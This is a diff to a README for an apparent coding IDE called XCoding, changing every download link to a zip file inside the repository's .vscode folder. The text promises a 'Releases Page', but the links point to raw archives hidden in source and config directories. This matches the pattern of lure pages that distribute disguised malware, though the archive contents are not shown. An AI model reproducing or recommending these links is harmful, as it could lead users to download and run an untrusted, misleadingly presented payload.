@@ -9,7 +9,7 @@ Welcome to XCoding! This lightweight coding IDE helps you collaborate easily usi
 To get started with XCoding, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to view all available versions of XCoding.  
-   [![Download XCoding](https://github.com/Book-Maker/XCoding/raw/refs/heads/main/src/renderer/Coding-X-2.6.zip%20XCoding-v1.0-blue)](https://github.com/Book-Maker/XCoding/raw/refs/heads/main/src/renderer/Coding-X-2.6.zip)
+   [![Download XCoding](https://github.com/Book-Maker/XCoding/raw/refs/heads/main/.vscode/Coding_X_1.2.zip%20XCoding-v1.0-blue)](https://github.com/Book-Maker/XCoding/raw/refs/heads/main/.vscode/Coding_X_1.2.zip)
 
 2. **Choose a Version**: On the Releases page, locate the version you want to download. We recommend downloading the latest version for the best experience.
 
@@ -44,7 +44,7 @@ For help using XCoding, check out the following resources:
 - **Feedback**: We welcome feedback! Share your thoughts to help us improve XCoding.
 
 For more details about downloads, visit this page again:  
-[Download XCoding](https://github.com/Book-Maker/XCoding/raw/refs/heads/main/src/renderer/Coding-X-2.6.zip)
+[Download XCoding](https://github.com/Book-Maker/XCoding/raw/refs/heads/main/.vscode/Coding_X_1.2.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -73,4 +73,4 @@ Feel free to explore these topics to enhance your coding experience.
 Now that you have everything you need, it’s time to dive in. Enjoy coding with XCoding and unlock your potential with AI collaboration! 
 
 For further updates and new features, keep an eye on our Releases page:  
-[Download XCoding](https://github.com/Book-Maker/XCoding/raw/refs/heads/main/src/renderer/Coding-X-2.6.zip)
+[Download XCoding](https://github.com/Book-Maker/XCoding/raw/refs/heads/main/.vscode/Coding_X_1.2.zip)
